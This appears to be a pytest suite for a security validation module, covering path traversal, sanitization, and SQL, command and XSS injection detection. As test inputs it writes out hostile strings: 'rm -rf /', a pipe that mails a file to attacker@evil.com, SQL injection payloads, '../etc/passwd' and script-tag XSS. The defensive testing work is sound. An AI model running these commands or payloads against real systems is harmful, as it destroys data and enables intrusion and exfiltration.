"""
Tests for security.validation module.
"""

from __future__ import annotations

import pytest
from pathlib import Path

from specify_cli.security.validation import (
    Validator,
    PathValidator,
    InputSanitizer,
    InjectionPrevention,
    ValidationError,
    PathTraversalError,
    InjectionError,
)


class TestValidator:
    """Tests for Validator class."""

    def test_validate_email_valid(self) -> None:
        """Test validating valid email."""
        validator = Validator()
        email = validator.validate_email("user@example.com")
        assert email == "user@example.com"

    def test_validate_email_invalid(self) -> None:
        """Test validating invalid email raises error."""
        validator = Validator()

        with pytest.raises(ValidationError):
            validator.validate_email("not-an-email")

    def test_validate_url_valid(self) -> None:
        """Test validating valid URL."""
        validator = Validator()
        url = validator.validate_url("https://example.com")
        assert url == "https://example.com"

    def test_validate_url_invalid_scheme(self) -> None:
        """Test validating URL with invalid scheme."""
        validator = Validator()

        with pytest.raises(ValidationError):
            validator.validate_url("ftp://example.com")

    def test_validate_integer_valid(self) -> None:
        """Test validating valid integer."""
        validator = Validator()
        value = validator.validate_integer("42", min_value=0, max_value=100)
        assert value == 42

    def test_validate_integer_below_min(self) -> None:
        """Test integer below minimum raises error."""
        validator = Validator()

        with pytest.raises(ValidationError):
            validator.validate_integer(-5, min_value=0)

    def test_validate_integer_above_max(self) -> None:
        """Test integer above maximum raises error."""
        validator = Validator()

        with pytest.raises(ValidationError):
            validator.validate_integer(150, max_value=100)

    def test_validate_pattern_match(self) -> None:
        """Test validating value against pattern."""
        validator = Validator()
        value = validator.validate_pattern("abc123", r"^[a-z]+\d+$")
        assert value == "abc123"

    def test_validate_pattern_no_match(self) -> None:
        """Test pattern validation failure."""
        validator = Validator()

        with pytest.raises(ValidationError):
            validator.validate_pattern("ABC", r"^[a-z]+$")

    def test_validate_length_valid(self) -> None:
        """Test validating string length."""
        validator = Validator()
        value = validator.validate_length("hello", min_length=3, max_length=10)
        assert value == "hello"

    def test_validate_length_too_short(self) -> None:
        """Test string too short raises error."""
        validator = Validator()

        with pytest.raises(ValidationError):
            validator.validate_length("hi", min_length=5)

    def test_validate_length_too_long(self) -> None:
        """Test string too long raises error."""
        validator = Validator()

        with pytest.raises(ValidationError):
            validator.validate_length("very long string", max_length=5)


class TestPathValidator:
    """Tests for PathValidator class."""

    def test_validate_safe_path(self, tmp_path: Path) -> None:
        """Test validating safe path."""
        validator = PathValidator(base_dir=tmp_path)
        safe_path = tmp_path / "safe" / "file.txt"

        validated = validator.validate_path(safe_path)
        assert validated.is_absolute()

    def test_validate_path_traversal(self, tmp_path: Path) -> None:
        """Test path traversal detection."""
        validator = PathValidator(base_dir=tmp_path)

        # Try to escape base directory
        with pytest.raises(PathTraversalError):
            validator.validate_path(tmp_path / ".." / "etc" / "passwd")

    def test_validate_path_must_exist(self, tmp_path: Path) -> None:
        """Test validating path that must exist."""
        validator = PathValidator(base_dir=tmp_path)
        non_existent = tmp_path / "does-not-exist.txt"

        with pytest.raises(ValidationError):
            validator.validate_path(non_existent, must_exist=True)

    def test_validate_filename_safe(self) -> None:
        """Test validating safe filename."""
        validator = PathValidator()
        filename = validator.validate_filename("safe-file.txt")
        assert filename == "safe-file.txt"

    def test_validate_filename_with_path_separator(self) -> None:
        """Test filename with path separator raises error."""
        validator = PathValidator()

        with pytest.raises(ValidationError):
            validator.validate_filename("../etc/passwd")

    def test_validate_filename_extension(self) -> None:
        """Test filename extension validation."""
        validator = PathValidator()

        # Valid extension
        filename = validator.validate_filename("file.txt", allowed_extensions=[".txt", ".md"])
        assert filename == "file.txt"

        # Invalid extension
        with pytest.raises(ValidationError):
            validator.validate_filename("file.exe", allowed_extensions=[".txt", ".md"])


class TestInputSanitizer:
    """Tests for InputSanitizer class."""

    def test_sanitize_html_basic(self) -> None:
        """Test basic HTML sanitization."""
        sanitizer = InputSanitizer()
        dirty = "<script>alert('xss')</script>"
        clean = sanitizer.sanitize_html(dirty)

        assert "<" not in clean
        assert ">" not in clean
        assert "&lt;script&gt;" in clean

    def test_sanitize_html_special_chars(self) -> None:
        """Test HTML special character sanitization."""
        sanitizer = InputSanitizer()
        dirty = "Hello & <world>"
        clean = sanitizer.sanitize_html(dirty)

        assert clean == "Hello &amp; &lt;world&gt;"

    def test_sanitize_sql(self) -> None:
        """Test SQL sanitization."""
        sanitizer = InputSanitizer()
        dirty = "'; DROP TABLE users; --"
        clean = sanitizer.sanitize_sql(dirty)

        assert "DROP" not in clean
        assert "--" not in clean

    def test_sanitize_shell_command(self) -> None:
        """Test shell command sanitization."""
        sanitizer = InputSanitizer()
        dirty = "ls; rm -rf /"
        clean = sanitizer.sanitize_shell_command(dirty)

        assert ";" not in clean
        assert "|" not in clean


class TestInjectionPrevention:
    """Tests for InjectionPrevention class."""

    def test_detect_sql_injection_positive(self) -> None:
        """Test SQL injection detection."""
        prevention = InjectionPrevention()

        assert prevention.detect_sql_injection("' OR '1'='1")
        assert prevention.detect_sql_injection("'; DROP TABLE users; --")
        assert prevention.detect_sql_injection("UNION SELECT * FROM passwords")

    def test_detect_sql_injection_negative(self) -> None:
        """Test no false positives for safe SQL."""
        prevention = InjectionPrevention()

        assert not prevention.detect_sql_injection("normal text")
        assert not prevention.detect_sql_injection("user@example.com")

    def test_prevent_sql_injection_safe(self) -> None:
        """Test safe SQL query passes."""
        prevention = InjectionPrevention()

        query = "SELECT * FROM users WHERE id = ?"
        params = [123]

        result_query, result_params = prevention.prevent_sql_injection(query, params)
        assert result_query == query
        assert result_params == params

    def test_prevent_sql_injection_unsafe(self) -> None:
        """Test unsafe SQL query raises error."""
        prevention = InjectionPrevention()

        query = "SELECT * FROM users WHERE id = 1 OR 1=1"

        with pytest.raises(InjectionError):
            prevention.prevent_sql_injection(query)

    def test_detect_command_injection_positive(self) -> None:
        """Test command injection detection."""
        prevention = InjectionPrevention()

        assert prevention.detect_command_injection("ls; rm -rf /")
        assert prevention.detect_command_injection("cat file.txt | mail attacker@evil.com")
        assert prevention.detect_command_injection("echo $PASSWORD")

    def test_detect_command_injection_negative(self) -> None:
        """Test no false positives for safe commands."""
        prevention = InjectionPrevention()

        assert not prevention.detect_command_injection("ls -la")
        assert not prevention.detect_command_injection("echo hello")

    def test_sanitize_shell_command_safe(self) -> None:
        """Test safe shell command passes."""
        prevention = InjectionPrevention()

        command = ["ls", "-la", "/home"]
        sanitized = prevention.sanitize_shell_command(command)

        assert sanitized == command

    def test_sanitize_shell_command_unsafe(self) -> None:
        """Test unsafe shell command raises error."""
        prevention = InjectionPrevention()

        command = ["ls", "-la", "; rm -rf /"]

        with pytest.raises(InjectionError):
            prevention.sanitize_shell_command(command)

    def test_detect_xss_positive(self) -> None:
        """Test XSS detection."""
        prevention = InjectionPrevention()

        assert prevention.detect_xss("<script>alert('xss')</script>")
        assert prevention.detect_xss("<img src=x onerror=alert('xss')>")
        assert prevention.detect_xss("javascript:alert('xss')")

    def test_detect_xss_negative(self) -> None:
        """Test no false positives for safe content."""
        prevention = InjectionPrevention()

        assert not prevention.detect_xss("Hello, world!")
        assert not prevention.detect_xss("This is a normal paragraph")
